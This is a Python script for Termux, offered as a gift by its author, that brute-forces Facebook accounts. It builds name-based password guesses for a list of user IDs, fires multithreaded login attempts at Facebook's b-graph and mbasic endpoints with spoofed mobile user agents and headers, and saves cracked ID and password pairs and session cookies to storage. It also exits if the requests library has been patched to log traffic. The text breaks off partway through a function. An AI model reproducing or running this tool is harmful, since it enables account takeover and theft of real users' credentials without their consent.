#!/usr/bin/python3
#cooding by TAYBUL
#open source by Taybul Islam 
#Eid Special Gift
#-------(start)-----#
import os, requests,random
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#------(modules)-----#
import os
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4')
    os.system('pip install requests')
import sys
import time
import requests
import uuid
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	print('\n Installing missing modules ...')
	os.system('pip install requests ')

from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
#--------(sys.stdout.write)--------#
sys.stdout.write('\x1b]2; TAYBUL»»[MR DEPRESSION-CYBER 101]\x07')
#---------(fuck)--------#
king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(king+'sessions.py','r').read():
    pass
else:
    exit('\033[1;32m»» AMI VALO POLA TAI KICU KOILAM NAH')
qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(qeen+'models.py','r').read():
    pass
else:
    exit('\033[1;32m»» AMI VALO POLA TAI KICU KOILAM NAH')

    
#--------(loop)-------#
loop =0
oks =[]
cps =[]
method=[]
user = []
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
id = []
#------(user argent)-----#
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

import random 
#Mozilla/5.0 (Linux; Android 10; Nokia C2 Tennen Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36
for xd in range(2000):
    aa='Mozilla/5.0 (Linux; Android;'
    b=random.choice(['7.0','8.1.0','9','10','11','12','13','14','15'])
    c=random.choice(['Nokia C2 Tennen Build/QP1A.190711.020; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    #Mozilla/5.0 (Linux; Android 10; Nokia C5 Endi Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android;'
    b=random.choice(['7.0','8.1.0','9','10','11','12','13','14','15'])
    c=random.choice(['Nokia C5 Endi Build/QP1A.190711.020; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)


for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

for xd in range(10000):
	bio = random.choice(['SM-G6100', 'SM-G610L', 'SM-G610K','SM-G615F', 'SM-G615FU','SM-J730G', 'SM-J730GM','SM-G9298','SM-G615F, SM-G615FU','SM-C7010', 'SM-C701F', 'SM-C7018','SM-J710FN','SM-A520F', 'SM-A520F', 'SM-A520K', 'SM-A520L', 'SM-A520S', 'SM-A520W','SM-A720F', 'SM-A720S','SM-C5010', 'SM-C5018','SM-C9000', 'SM-C900F', 'SM-C9008', 'SM-C900Y','SM-A8100', 'SM-A810F', 'SM-A810F', 'SM-A810YZ', 'SM-A810S','SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M','SM-J105F', 'SM-j105H', 'SM-J105H', 'SM-J105B', 'SM-J105Y', 'SM-J105M','SM-G388F', 'R3','SM-J106F', 'SM-J106B', 'SM-J106H', 'SM-J106M','SM-J701F', 'SM-J701F', 'SM-J701M', 'SM-J701MT','SO-02H', 'E5823', 'E5803','SM-J720F', 'SM-J720F/DS', 'SM-J720M', 'SM-J720M/DS','X00ID', 'X00IS', 'X00HDA', 'ZC554KL','XT1766', 'XT1763','G3116', 'G3121', 'G3112', 'G3123', 'G3125','SM-A605FN', 'SM-A605G', 'SM-A605F', 'SM-A605GN', 'SM-A6050', 'SM-A605K', 'SM-A605X', 'SM-A6058','SM-A750F', 'SM-A750FN', 'SM-A750G', 'SM-A750GN', 'SM-A750C', 'SM-A750X', 'SM-A750N','SM-G885F', 'SM-G8850', 'SM-G885Y', 'SM-G885S', 'SM-G8858','SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M','SM-J105F', 'SM-j105H', 'SM-J105H', 'SM-J105B', 'SM-J105Y', 'SM-J105M','SM-G388F', 'R3','SM-J106F', 'SM-J106B', 'SM-J106H', 'SM-J106M','SM-J250F', 'SM-J250G', 'SM-J250F', 'SM-J250M', 'SM-J250Y','SM-A260F', 'SM-A260G','SM-G532F','SM-G532G', 'SM-G532M', 'SM-G532G', 'SM-G532F', 'SM-G532MT','MT7-TL00', 'MT7-L09', 'MT7-TL10', 'MT7-CL00', 'MT7-UL00','PRA-TL10', 'PRA-TL20', 'PRA-LA1', 'PRA-LX1', 'PRA-LX2', 'TAG-L21', 'PRA-AL00X', 'TAG-L32', 'PRA-LX3', 'PRA-AL00','EVA-L09', 'EVA-L19', 'EVA-L29', 'EVA-AL10', 'EVA-TL00', 'EVA-AL00', 'EVA-DL00','SLA-L02', 'SLA-L22', 'SLA-L03', 'SLA-L23','WAS-LX1', 'WAS-LX2', 'WAS-LX3', 'WAS-LX1A', 'WAS-LX2J', 'WAS-L03T', 'WAS-AL00', 'WAS-TL10','POT-LX1', 'POT-LX1AF', 'POT-LX2J', 'POT-LX1RUA', 'POT-LX3','HMA-L09', 'HMA-LX9', 'HMA-L29', 'HMA-AL00', 'HMA-TL00','LIO-L09', 'LIO-L29', 'LIO-AL00', 'LIO-TL00','MYA-L03', 'MYA-L23', 'MYA-L02, MYA-L22', 'MYA-U29', 'MYA-L13','DUB-LX1', 'DUB-LX3','DUB-LX1'])
	ua = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(bio))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
	ugen.append(ua)

#----(vers)--------#
version="0.1"
#------(colour)-----#
g='\033[1;92m'
r='\033[1;91m'
w='\033[1;97m'
b='\033[1;95m'
y='\033[1;93m'

#-----(LINE)----#
#def line():
Lin=f'{r}-----------------------------------------'
#------(main)-----#
def Main():
    a =(f'{b}[{r}1{b}] {g}START FILE {w}BD{r}/{y}IND\n')
    ab =(f'{b}[{r}2{b}] {g}START FILE IND\n')
    c =(f'{b}[{r}0{b}] {g}EXIT PROGRAM\n')
    Tay = a+c+Lin
    print(Tay)
    Taybul=input(f'{b}[{r}/{b}] {g} CHOICE {r}: {g}')
    if Taybul in ['1']:
        file()
    elif Taybul in ['2']:    
        file()
    elif Taybul in ['0']:
        exit()   
#------(logo)-------#
def logo():
    os.system('clear')
    print(f"""{w}
  {b}«{r}/{b}»{g} TOOLS MAKE BY TAYBUL ISLAM 
{w}   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( \033[1;92mD {w}| \033[1;91mE {w}| \033[1;93mP {w}| \033[1;94mR {w}| \033[1;95mE {w}| \033[1;96mS {w}| \x1b[38;5;132mS {w}| \x1b[38;5;157mI {w}| \x1b[38;5;140mO {w}| \x1b[38;5;167mN {w})
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \x1b[1;93mV\x1b[1;96m>\x1b[1;91m{version}
  {b}«{r}/{b}»{g} CYBER 101 IN A NEW FROM
  {b}«{r}/{b}»{g} GIFT EID SPECIAL {r}»{g} FILE CLONE
{r}-----------------------------------------""")

#-----(approvel)_____

#-------(menu)------#
def menu():
    logo()
    print(Lin)
    Main()

#-----(file def)-----#
def file():
    logo()
    print(Lin)
    print(f'{b}[{r}1{b}] {g} METHOD {b}[{r}Host{b}] ')
    print(f'{b}[{r}2{b}] {g} METHOD {b}[{r}B-graph{b}] ');print(Lin)
    MTD = input(f'{b}[{r}/{b}] {g} CHOICE {r}: {g}')
    if MTD in ["1"]:
        met="HOST"
    elif MTD in ["2"]:
        met="B_GRAPH"    
    print(Lin);print(f'{b}[{r}/{b}] {g} EXAMPLE {r}> {y}/sdcard/DEPRESSION.txt')
    file=input(f'{b}[{r}/{b}] {g} CHOICE {r}: {g}')
    try:
        fid = open(file,'r').read().splitlines()
    except FileNotFoundError:    
        exit(f'{b}[{y}>{b}] {r}File Location Not Found ')
    
    with ThreadPool(max_workers=40) as pool:
        idt= str(len(fid)) 
        logo()
        print(Lin)
        print(f'{b}[{r}/{b}] {g}TOTAL ID{r}|{w}{idt}{r}|{g}METHOD{r}|{w}{met} {b} ')
        print(f'{b}[{r}/{b}] {g}USE AROPLAN {w}ON{r}/{w}OFF{g} FOR MORE IDZ')
        print(Lin)
        
        for user in fid:
            uid,name = user.split('|')[0],user.split('|')[1].lower() 
            pwx = []
            frs = name.split(' ')[0]
            if len(frs)<=2:
                pwx.append(name)
                pwx.append(name+'123')
                pwx.append(name+'1234')
                pwx.append(name+'@')
                pwx.append(name+'@@@')
                try:
                    lss = name.split(' ')[1].lower()
                    if len(lss)<=3 or (lss) == 'khan' or (lss) == 'islam' or (lss) == 'akter' or (lss) == 'rahman' or (lss) == 'ahmed' or (lss) == 'jahan' or (lss) == 'ahmmed':
                        pass
                    else:    
                        pwx.append(lss+'123')
                        try:
                            lsd = name.split(' ')[2]
                            if len(lsd)<=3 or (lsd) == 'khan' or (lsd) == 'islam' or (lsd) == 'akter' or (lsd) == 'rahman' or (lsd) == 'ahmed' or (lsd) == 'jahan' or (lsd) == 'ahmmed':
                                pass
                            else:    
                                pwx.append(lsd+'123')
                        except:        
                            pass
                except:                
                    pass
            else:
                pwx.append('57273200')
                pwx.append('59039200')
                pwx.append('57575751')
                pwx.append(frs+'12')
                pwx.append(frs+'123')
                pwx.append(frs+'1234')
                pwx.append(frs+'12345')
                pwx.append(frs+'123456')
                pwx.append(frs+'1122')
                pwx.append(frs+'@123')
                pwx.append(frs+'@')
                pwx.append(frs+'@@')
                pwx.append(frs+'@@@')
                pwx.append(frs+'@@@@')
                pwx.append(frs+'@#')
                pwx.append(frs+'12@')
                pwx.append(frs+'123@')
                pwx.append(frs+'111')
                try:
                    lss = name.split(' ')[1]
                    if len(lss)<=3 or (lss) == 'khan' or (lss) == 'islam' or (lss) == 'akter' or (lss) == 'rahman' or (lss) == 'ahmed' or (lss) == 'jahan' or (lss) == 'ahmmed':
                        pass
                    else:    
                        pwx.append(lss+'123')
                except:            
                    pass
            if MTD in ["1"]:        
                pool.submit(taybulcrack1,uid,pwx)
            elif MTD in ["2"]:
                pool.submit(taybulcrack2,uid,pwx)
            
    print(Lin);print(f'{b}[{r}/{b}] {g}COMPLETE YOUR CLONE')
    print(f'{b}[{r}/{b}] {g}TOTAL OK ID : {y}{str(len(oks))}');print(Lin)


def taybulcrack2(uid,pwx):
    global oks,loop
    sys.stdout.write(f"\r \033[1;91m»»\033[38;5;46mTAYBUL\033[1;91m|\033[38;5;46m{loop}\033[1;91m|\033[38;5;46mOK:{str(len(oks))}\033[1;91m|\033[38;5;46m ");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            agent='Dalvik/2.1.0 (Linux; U; Android 14; SM-Y443 Build/RKQ.151093.663) [FBAN/FB4A;FBAV/409.0.0.25.25;FBPN/com.facebook.mlite;FBLC/fr_FR;FBBV/723569920;FBCR/Grameenphone;FBMF/Samsung;FBBD/Samsung;FBDV/SM-Y443;FBSV/5.5.1;FBCA/x86:armeabi-v7a;FBDM/{density=3.0,width=1235,height=1880};FB_FW/1;FBRV/0;]'
            #print(agent)
            headers = {
            'User-Agent': agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            taybul = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            DEPRESSIONking=json.loads(taybul)
            if "session_key" in DEPRESSIONking:
                koki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r\x1b[38;5;196m[\x1b[38;5;46mDEPRESSION—OK\x1b[38;5;196m]\033[1;96m»»\033[1;32m {uid} | {ps} \033[1;96m»»\033[1;32m {koki}    ")
                open("/sdcard/TAYBUL—DEPRESSION-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in DEPRESSIONking:
                print(f"\r\r\033[1;91m [DEPRESSION—CP] {uid} | {ps}      ")
                open("/sdcard/TAYBUL—DEPRESSION-cp.txt","a").write(uid+"|"+ps+"\n")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)
        
def taybulcrack1(uid,pwx):
	global loop,oks
	t=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
	sys.stdout.write(f"\r \033[1;91m»»\033[38;5;46mTAYBUL\033[1;91m|\033[38;5;46m{loop}\033[1;91m|\033[38;5;46mOK:{str(len(oks))}\033[1;91m|\033[38;5;46m ");sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	#print(ua)
	#print(ua2)
	ses = requests.Session()
	for pw in pwx:
		try:
			pw = pw.lower()
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			ses.headers.update({"Host":'mbasic.facebook.com',
            "upgrade-insecure-requests":"1",
           "user-agent":ua2,
           "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
           "dnt":"1",
           "x-requested-with":"mark.via.gp",
           "sec-fetch-site":"same-origin",
           "sec-fetch-mode":"cors",
           "sec-fetch-user":"empty",
           "sec-fetch-dest":"document",
           "referer":"https://mbasic.facebook.com/",
           "accept-encoding":"gzip, deflate br",
           "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			data ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'mbasic.facebook.com',
            "cache-control":"max-age=0",
            "upgrade-insecure-requests":"1",
            "origin":"https://mbasic.facebook.com",
            "content-type":"application/x-www-form-urlencoded",
            "user-agent":ua,
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "x-requested-with":"mark.via.gp",
            "sec-fetch-site":"same-origin",
            "sec-fetch-mode":"cors",
            "sec-fetch-user":"empty",
            "sec-fetch-dest":"document",
            "referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',
